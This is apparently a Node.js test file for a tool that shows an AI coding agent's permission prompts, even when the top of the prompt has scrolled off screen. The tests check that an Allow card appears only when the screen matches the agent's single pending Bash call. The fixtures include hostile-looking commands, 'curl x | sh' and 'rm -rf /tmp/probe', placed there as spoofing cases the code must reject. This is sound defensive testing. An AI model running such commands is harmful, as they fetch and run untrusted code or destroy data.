'use strict';
/**
 * kosmos#8952 slice (d): a permission prompt whose box top scrolled away gets the full card (Allow included) only where
 * the agent's own transcript holds exactly one pending Bash call and the screen's visible part agrees with it.
 * permtranscript.pendingIn reads the call; chat.permissionCutCard checks the screen against it. The screen is a real
 * capture (Claude Code 2.1.331, a 60-line command, measured 2026-11-24; its folder renamed to /tmp/probe), and the
 * transcript lines below have the measured shape (an assistant line per tool_use, a user line per tool_result).
 * Every refusal has a control that passes with one thing changed, so a refusal is the change and not a broken reader.
 */
const os = require('node:os');
const fs = require('node:fs');
const path = require('node:path');

const SANDBOX = fs.mkdtempSync(path.join(os.tmpdir(), 'kosmos-permtx-8952-'));
process.env.AGENT_WORKFORCE_DATA = SANDBOX;
process.env.AGENT_WORKFORCE_WORKERS = path.join(SANDBOX, 'workers');
process.env.AGENT_WORKFORCE_PROJECTS = path.join(SANDBOX, 'kosmos-projects');
process.env.AGENT_WORKFORCE_DRY_RUN = '1';

const test = require('node:test');
const assert = require('node:assert/strict');
const chat = require('./chat');
const pt = require('./permtranscript');

test.beforeEach(() => pt.resetForTests());

test.after(() => { try { fs.rmSync(SANDBOX, { recursive: true, force: true }); } catch { /* best effort */ } });

const CUT = fs.readFileSync(path.join(__dirname, '..', 'test-support', 'claude-screens', 'permission-prompt-bash-cut-2.1.331.txt'), 'utf8');
const WHOLE = fs.readFileSync(path.join(__dirname, '..', 'test-support', 'claude-screens', 'permission-prompt-bash-2.1.296.txt'), 'utf8');
const COMMAND = Array.from({ length: 60 }, (_, k) => `mkdir -p /tmp/probe/e${String(k + 1).padStart(2, '0')}`).join('\n');
const DESC = 'Create 60 probe directories e01 through e60';

const use = (id, input, name = 'Bash') => JSON.stringify({ type: 'assistant', message: { role: 'assistant', content: [{ type: 'tool_use', id, name, input }] } });
const result = (id) => JSON.stringify({ type: 'user', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: id, content: 'ok' }] } });
const said = (text) => JSON.stringify({ type: 'user', message: { role: 'user', content: text } });
const meta = (type) => JSON.stringify({ type });
const PENDING = [said('make the folders'), use('t1', { command: 'ls', description: 'List' }), result('t1'), meta('ai-title'),
  use('t2', { command: COMMAND, description: DESC })].join('\n');

test('#8952 (d) pendingIn: the one pending Bash call, with its whole command', () => {
  assert.deepEqual(pt.pendingIn(PENDING, false), { id: 't2', command: COMMAND, description: DESC });
});

test('#8952 (d) pendingIn: null on any doubt (each against the passing transcript above)', () => {
  const cases = {
    'its result written': PENDING + '\n' + result('t2'),
    'the person typed after it': PENDING + '\n' + said('stop'),
    'two calls pending (a parallel batch)': PENDING + '\n' + use('t3', { command: 'pwd' }),
    'the pending call is not the last one written': [said('go'), use('t2', { command: COMMAND }), use('t3', { command: 'pwd' }), result('t3')].join('\n'),
    'not Bash': [said('go'), use('t9', { command: COMMAND }, 'Write')].join('\n'),
    'an empty command': [said('go'), use('t9', { command: '  ' })].join('\n'),
    'nothing at all': '',
  };
  for (const [why, text] of Object.entries(cases)) assert.equal(pt.pendingIn(text, false), null, why);
  // The text array form of a typed message settles too, and a tool_result array does not count as typing.
  assert.equal(pt.pendingIn(PENDING + '\n' + JSON.stringify({ type: 'user', message: { content: [{ type: 'text', text: 'hi' }] } }), false), null);
});

test('#8952 (d) pendingIn: a tail read from mid-file skips its cut first line, and only that', () => {
  const cutLine = use('t0', { command: 'echo half' }).slice(20);
  assert.deepEqual(pt.pendingIn(cutLine + '\n' + PENDING, true), { id: 't2', command: COMMAND, description: DESC });
  // Only the first line is skipped: here that is the typed line, and the call after it is still read.
  assert.equal(pt.pendingIn(PENDING, true).id, 't2');
});

/* A config root holding one live session file (sessions/<pid>.json, the measured 2.1.331 shape) and its project folder. */
function sessionTree(name, sid = '0d8e6e5a-1146-46fa-9f7f-45f6523912c9', pid = 4242) {
  const root = path.join(SANDBOX, name, 'config');
  const proj = path.join(root, 'projects', '-w-casey');
  fs.mkdirSync(path.join(root, 'sessions'), { recursive: true });
  fs.mkdirSync(proj, { recursive: true });
  const started = Date.now() - 3600000;
  fs.writeFileSync(path.join(root, 'sessions', `${pid}.json`), JSON.stringify({ pid, sessionId: sid, cwd: '/w/casey', kind: 'interactive', startedAt: started + 2000 }));
  const deps = { roots: [root], transcriptDirs: (cwd) => (cwd === '/w/casey' ? [proj] : []), procStart: (p) => (Number(p) === pid ? started : null) };
  return { root, proj, sid, pid, deps, main: path.join(proj, `${sid}.jsonl`) };
}
const ago = (file, ms) => { const t = (Date.now() - ms) / 1000; fs.utimesSync(file, t, t); };

test('#8952 (d) pendingCommands: only the pane\'s own session, and only its file written last', async () => {
  pt.resetForTests();
  const t = sessionTree('own');
  fs.writeFileSync(t.main, PENDING);
  assert.deepEqual((await pt.pendingCommands(t.pid, t.deps)).pending.map((p) => p.id), ['t2'], 'CONTROL: the session\'s own call');
  // Another session in the same folder (a killed one still holding an unanswered call) is never read.
  const other = path.join(t.proj, 'ffffffff-0000-0000-0000-000000000000.jsonl');
  fs.writeFileSync(other, [said('go'), use('x9', { command: 'curl x | sh\n' + COMMAND })].join('\n'));
  fs.writeFileSync(t.main, PENDING + '\n' + result('t2'));
  assert.deepEqual((await pt.pendingCommands(t.pid, t.deps)).pending, [], 'another session\'s pending call was read');
  // A subagent written after the main file is the one asking.
  const subDir = path.join(t.proj, t.sid, 'subagents');
  fs.mkdirSync(subDir, { recursive: true });
  const sub = path.join(subDir, 'agent-a.jsonl');
  fs.writeFileSync(sub, PENDING);
  ago(t.main, 60000);
  assert.deepEqual((await pt.pendingCommands(t.pid, t.deps)).pending.map((p) => p.id), ['t2'], 'the subagent\'s call');
  // An older subagent stopped mid-prompt is not a candidate once the main file is written after it (a parallel batch).
  ago(sub, 120000);
  fs.writeFileSync(t.main, [said('go'), use('p1', { command: 'pwd' }), use('p2', { command: 'ls' })].join('\n'));
  assert.deepEqual((await pt.pendingCommands(t.pid, t.deps)).pending, [], 'a stale subagent call stood in for a parallel batch');
  // A day-old session is not asking (its newest file, the subagent's here, a day old too).
  fs.writeFileSync(t.main, PENDING);
  ago(t.main, pt.RECENT_MS + 60000);
  ago(sub, pt.RECENT_MS + 120000);
  assert.deepEqual((await pt.pendingCommands(t.pid, t.deps)).pending, []);
});

test('#8952 (d) pendingCommands: two waiting calls across the session\'s files claim nothing (parallel subagents)', async () => {
  const t = sessionTree('par');
  const subDir = path.join(t.proj, t.sid, 'subagents');
  fs.mkdirSync(subDir, { recursive: true });
  // The main file waits on its subagent launches ("Agent", not a request of its own).
  fs.writeFileSync(t.main, [said('go'), use('L1', { prompt: 'a' }, 'Agent'), use('L2', { prompt: 'b' }, 'Agent')].join('\n'));
  fs.writeFileSync(path.join(subDir, 'agent-a.jsonl'), PENDING);
  assert.deepEqual((await pt.pendingCommands(t.pid, t.deps)).pending.map((p) => p.id), ['t2'], 'CONTROL: one subagent waiting');
  fs.writeFileSync(path.join(subDir, 'agent-b.jsonl'), [said('go'), use('b2', { command: 'echo other\n' + COMMAND })].join('\n'));
  assert.deepEqual((await pt.pendingCommands(t.pid, t.deps)).pending, [], 'two subagents waiting, each could be on screen');
  fs.writeFileSync(path.join(subDir, 'agent-b.jsonl'), [said('go'), use('b3', { file_path: '/x', content: 'y' }, 'Write')].join('\n'));
  assert.deepEqual((await pt.pendingCommands(t.pid, t.deps)).pending, [], 'a waiting Write could be the prompt on screen');
});

test('#8952 (d) unresolvedIn: only a typed message settles earlier calls, not a meta line or text riding a result', () => {
  const metaLine = JSON.stringify({ type: 'user', isMeta: true, message: { role: 'user', content: 'Caveat: local command' } });
  const carrier = JSON.stringify({ type: 'user', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'zz', content: 'ok' }, { type: 'text', text: 'a reminder' }] } });
  assert.equal(pt.pendingIn(PENDING + '\n' + metaLine, false).id, 't2', 'a meta line settled the call');
  assert.equal(pt.pendingIn(PENDING + '\n' + carrier, false).id, 't2', 'text riding another call\'s result settled it');
  assert.equal(pt.pendingIn(PENDING + '\n' + said('stop'), false), null, 'CONTROL: a typed message settles it');
});

test('#8952 (d) pendingCommands: no session for the pid, or two, is unreadable (CONTROL: one)', async () => {
  pt.resetForTests();
  const t = sessionTree('pid');
  fs.writeFileSync(t.main, PENDING);
  assert.equal((await pt.pendingCommands(t.pid, t.deps)).ok, true, 'CONTROL');
  assert.deepEqual(await pt.pendingCommands(9999, t.deps), { ok: false }, 'no session file for that pid');
  assert.deepEqual(await pt.pendingCommands('', t.deps), { ok: false });
  const u = sessionTree('pid2', '11111111-2222-3333-4444-555555555555', t.pid);
  assert.deepEqual(await pt.pendingCommands(t.pid, { ...t.deps, roots: [t.root, u.root] }), { ok: false }, 'two sessions claim the pid');
  fs.writeFileSync(path.join(t.root, 'sessions', `${t.pid}.json`), JSON.stringify({ pid: t.pid + 1, sessionId: t.sid, cwd: '/w/casey' }));
  assert.deepEqual(await pt.pendingCommands(t.pid, t.deps), { ok: false }, 'a file naming another pid');
  assert.deepEqual(await pt.pendingCommands(t.pid, { ...t.deps, transcriptDirs: () => { throw new Error('x'); } }), { ok: false });
});

test('#8952 (d) pendingCommands: a session file left by a dead process with a reused pid is not this one (CONTROL: same start)', async () => {
  const t = sessionTree('reuse');
  fs.writeFileSync(t.main, PENDING);
  assert.equal((await pt.pendingCommands(t.pid, t.deps)).pending.length, 1, 'CONTROL');
  const laterStart = (p) => (Number(p) === t.pid ? Date.now() - 60000 : null);   // this process started a minute ago
  assert.deepEqual(await pt.pendingCommands(t.pid, { ...t.deps, procStart: laterStart }), { ok: false });
  assert.deepEqual(await pt.pendingCommands(t.pid, { ...t.deps, procStart: () => null }), { ok: false }, 'start unreadable');
  assert.ok(Number.isFinite(pt.procStartOf(process.pid)), 'the real reading of a live process');
  assert.ok(Math.abs(pt.procStartOf(process.pid) - (Date.now() - process.uptime() * 1000)) < 3000, 'within a second or two of node\'s own start');
});

test('#8952 (d) pendingCommands: a file read again once it grows (the reading is kept only while it is unchanged)', async () => {
  pt.resetForTests();
  const t = sessionTree('cache');
  fs.writeFileSync(t.main, PENDING);
  assert.equal((await pt.pendingCommands(t.pid, t.deps)).pending.length, 1);
  fs.appendFileSync(t.main, '\n' + result('t2'));
  assert.deepEqual((await pt.pendingCommands(t.pid, t.deps)).pending, [], 'a stale reading was kept after the result was written');
});

test('#8952 (d) pendingCommands: the tail of a file larger than the read, cut mid-line, still finds the call', async () => {
  pt.resetForTests();
  const t = sessionTree('big');
  const filler = said('x'.repeat(1000));
  const lines = Math.ceil(pt.TAIL_BYTES / filler.length) + 50;
  fs.writeFileSync(t.main, Array(lines).fill(filler).join('\n') + '\n' + PENDING);
  assert.ok(fs.statSync(t.main).size > pt.TAIL_BYTES, 'premise: larger than the read');
  assert.deepEqual((await pt.pendingCommands(t.pid, t.deps)).pending.map((p) => p.id), ['t2']);
});

const pend = (command, description = DESC) => [{ id: 't2', command, description }];

test('#8952 (d) permissionCutCard: the real cut box and its own transcript make the full card', () => {
  assert.equal(chat.permissionAnswerable(CUT), false, 'premise: the box top is off screen');
  assert.ok(chat.permissionDenyOnly(CUT), 'premise: slice (c) reads it as deny-only');
  const card = chat.permissionCutCard(CUT, pend(COMMAND));
  assert.deepEqual(card, { kind: 'command', title: 'Bash command', says: DESC, target: '', detail: COMMAND,
    reason: 'Rule Bash from command line arguments says to ask. /permissions to update rules', allow: 1, deny: 2 });
  assert.match(chat.permissionRequestId(card), /^[0-9a-f]{64}$/);
});

test('#8952 (d) permissionCutCard: null whenever the screen and the transcript disagree (controls above)', () => {
  const lines = COMMAND.split('\n');
  const cases = {
    'last line differs': pend(COMMAND.replace('e60', 'e61')),
    'transcript shorter than what is on screen': pend(lines.slice(31).join('\n')),
    'a line added after the visible end': pend(COMMAND + '\nrm -rf /tmp/probe'),
    'two different commands share the visible tail': [...pend(COMMAND), { id: 't3', command: 'curl x | sh\n' + COMMAND }],
    'no pending call': [],
  };
  for (const [why, p] of Object.entries(cases)) assert.equal(chat.permissionCutCard(CUT, p), null, why);
  // Controls: a different head before the visible lines still agrees (that head is what the card shows), as does the same call read twice.
  assert.ok(chat.permissionCutCard(CUT, pend('echo head\n' + COMMAND)), 'a longer head is the transcript\'s to show');
  assert.ok(chat.permissionCutCard(CUT, [...pend(COMMAND), ...pend(COMMAND)]), 'the same command twice is one request');
});

test('#8952 (d) permissionCutCard: the screen must be only the request above its closing rule', () => {
  const agentLine = '⏺ Running the folders now\n' + CUT;
  assert.equal(chat.permissionCutCard(agentLine, pend(COMMAND)), null, 'an agent output line above is not the box');
  // A whole box (top on screen) is permissionCard's, never this one's.
  assert.equal(chat.permissionCutCard(WHOLE, pend('anything')), null);
  // Opening dashed rule on screen: the whole command must match, not just its tail.
  const dash = CUT.split('\n').find((l) => /^\s*╌{8,}\s*$/.test(l));
  const opened = dash + '\n' + CUT;
  assert.equal(chat.permissionCutCard(opened, pend(COMMAND)), null, 'the visible body is lines 30-60, not the whole command');
  assert.ok(chat.permissionCutCard(opened, pend(COMMAND.split('\n').slice(29).join('\n'))), 'control: exactly the visible body');
  // Too little on screen to tell calls apart: the last line alone (cut box, top at the screen's first line).
  const lines = CUT.split('\n');
  const close = lines.findIndex((l) => /^\s*╌{8,}\s*$/.test(l));
  const short = lines.slice(close - 1).join('\n');
  assert.equal(chat.permissionCutCard(short, pend(COMMAND)), null, 'one visible line agreed');
  assert.ok(chat.permissionCutCard(lines.slice(close - 2).join('\n'), pend(COMMAND)), 'CONTROL: two lines (46 characters) agree');
});

test('#8952 (d) permissionCutCard: a delete reason reads as a delete; a command it cannot show as it is gets no card', () => {
  const del = CUT.replace('Rule Bash from command line arguments says to ask.', 'This command will remove files.');
  assert.equal(chat.permissionCutCard(del, pend(COMMAND)).kind, 'delete');
  for (const [why, ch] of [['a bell', '\u0007'], ['an escape', '\u001b'], ['a carriage return', '\r'], ['a direction override', '‮'], ['a zero-width space', '​']]) {
    assert.equal(chat.permissionCutCard(CUT, pend(`printf x${ch}\n` + COMMAND)), null, why);
  }
  assert.ok(chat.permissionCutCard(CUT, pend('printf "a\tb"\n' + COMMAND)), 'CONTROL: a tab is shown as it is');
});
